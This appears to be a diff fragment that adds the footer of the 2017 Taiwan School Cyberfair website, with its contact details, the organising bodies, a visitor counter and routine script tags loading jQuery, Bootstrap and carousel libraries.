+            <div class="footer-inner">
+                <div class="container clearfix">
+                    <div class="row">
+
+                        <div class="col-sm-4">
+                            <p><strong>網頁客服專線: </strong></p>
+                            <p>電話：(03)459-3388#23徐小姐</p>
+                            <p>cyberfair2017@taiwanschoolnet.org</p>
+                                                    
+                        </div>
+                        <div class="col-sm-4">
+                            <p><strong>活動辦法洽詢：</strong></p>
+                            <p>新北市立北大高中</p>
+                            <p>02-26742666 分機 205 高小筑老師</p>
+                            <p>hsiaochukao@gmail.com</p>
+                            <p>請在週一至週五9:00-17:00上班時間連絡</p>
+                        </div>
+                        <div class="col-sm-4">
+                                                        <!-- <p>指導單位：教育部</p> -->
+                            <p>主辦單位：新北市政府教育局</p>
+                            <p>承辦單位：新北市立北大高中</p>
+                                                    </div>
+                    </div>                             
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <div class="container clearfix">
+                    <div class="copyright">© 2017 Taiwan School Cyberfair</div>
+                    <div class="counting">參訪人數：5707722 / 線上人數：3</div>                </div>
+            </div>        
+        </footer><!-- #footer end -->
+</div>
+
+</body>
+<!-- Owl Carousel Assets --><link href="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/css/owl.carousel.css" rel="stylesheet">
+<link href="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/css/owl.theme.css" rel="stylesheet">
+<script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/jquery.min.js"></script><script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/fancybox/jquery.fancybox.js"></script><script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/lib/bootstrap.min.js"></script><script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/modernizr.custom.min.js"></script><script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/owl.carousel.js"></script><script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/jquery.plugin.min.js"></script><script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/jquery.countdown.min.js"></script><script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/modules/site/js/jquery.cookie/jquery.cookie.js"></script><script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/waypoints/2.0.3/waypoints.min.js"></script><script type="text/javascript" src="/themes/2016/assets/js/jquery.counterup.min.js"></script><script type="text/javascript" src="http://cyberfair2017.taiwanschoolnet.org/themes/2017/assets/js/theme.js"></script><script type="text/javascript">
+jQuery(document).ready(function($) {
+    $('.counter .count').counterUp({
+        delay: 10,
+        time: 1000
+    });
+});
+</script><script src="http://cyberfair2017.taiwanschoolnet.org/modules/team/js/detail_index.js"></script><script>
+</script>
+</html>
